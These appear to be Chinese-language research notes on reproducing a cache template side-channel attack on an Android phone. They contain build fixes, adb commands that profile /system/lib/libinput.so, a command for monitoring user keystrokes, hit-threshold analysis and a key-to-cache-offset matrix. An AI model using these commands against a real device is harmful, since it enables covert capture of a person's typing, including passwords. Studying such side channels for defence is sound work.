# 一些操作
向`/opt/android/ndk/toolchains/arm-linux-androideabi-4.9/prebuilt/linux-x86_64/lib/gcc/arm-linux-androideabi/4.9.x/include`文件夹中移动了`/libflush/libflush/armv7`文件夹以解决
```bash
 [CC] cache_template_attack/calibrate.c
cache_template_attack/calibrate.c:5:31: fatal error: libflush/libflush.h: No such file or directory
 #include <libflush/libflush.h>
                               ^
compilation terminated.
```
问题

在编译`cache_template_attack`的时候，删除上面添加的`.so.*`动态链接库，可以获得加入静态库可以直接在手机中执行的程序版本。

在编译libflush的时候在命令行中添加`DESTDIR`参数来安装库到制定的文件夹
```sh
make DESTDIR=/opt/android/ndk/platforms/android-23/arch-arm/ install
```

通过`cat /system/build.prop | grep product`来获得系统芯片信息。


```sh
eviction_strategy_evaluator -c conf.yml -x cancro.yml run_strategies -e 30 -a 10 -d 10 -n 10000
```

run_stategies时不用连接手机
命令为
```sh
eviction_strategy_evaluator -c conf.yml -x cancro.yml evaluate_strategies /home/larry/Documents/cancro -t 95
```


获得数据的命令行为
```sh
adb shell /data/local/tmp/input-simulator -r -1 -d 1 s &

adb shell /data/local/tmp/cache_template_attack -c 0 -r b6b19000-b6b33000 -o 000000000 -f 1 /system/lib/libinput.so -l /data/local/tmp/log/s.log

adb shell kill 'adb shell ps | grep input-simulator | grep input-simulator | awk '{print $2}'| head -1'
```
监测用户输入数据的命令为

```sh
adb shell /data/local/tmp/cache_template_attack -s -c 0 -r b6b19000-b6b33000 -o 00006480 -f 1 /system/lib/libinput.so -l /data/local/tmp/log/test.log
```


从Hits频率分布结果
```
10     0.641318
11     0.662311
12     0.682751
13     0.702702
14     0.722265
15     0.741618
16     0.760365
17     0.778456
18     0.795565
19     0.811666
20     0.826513
21     0.840285
22     0.852823
23     0.864393
24     0.874818
25     0.884254
26     0.892739
27     0.900445
28     0.907511
29     0.914031
```
可以看出大约80%的Hits结果分布在[0,20]的范围内，90%分布在[0,30]范围内，所以可选择将20或者30最为一个阈值对结果进行分析



## 矩阵生成算法

初期通过人工选择得到的地址为
```
0x27c0
0xe480
0x1f00
0x1b80
0x10980
0x15c0
0x15680
0x18580
```

通过算法得到的地址为

```
0xcd80
0x15680
0x17540
0x13900
0xcc40
0x27c0
```
分布矩阵为
```
Offset     0xcd80  0x15680  0x17540  0x13900  0xcc40  0x27c0
a               1        0        0        1       1       1
b               2        3        3        3       2       1
backspace       0        1        0        1       1       1
c               1        3        3        1       0       1
d               1        0        0        1       0       1
e               0        3        0        1       0       1
enter           2        3        3        3       1       1
f               3        1        0        3       1       1
g               0        0        3        3       3       1
h               2        3        0        1       1       1
i               0        1        1        1       1       1
j               3        2        0        3       1       1
k               1        3        3        1       3       1
l               3        1        0        0       1       1
m               1        0        0        0       1       1
n               3        0        1        1       1       1
none            1        0        1        1       0       1
o               0        0        0        0       0       1
p               1        0        0        3       1       1
q               3        1        0        3       0       1
r               3        3        1        1       3       1
s               1        0        0        1       3       0
space           3        0        3        1       1       1
t               0        0        0        0       0       0
u               0        1        3        0       1       1
v               3        0        0        2       1       1
w               0        0        0        1       3       1
x               0        0        2        1       3       1
y               3        0        0        1       1       1
z               0        0        1        1       1       1
```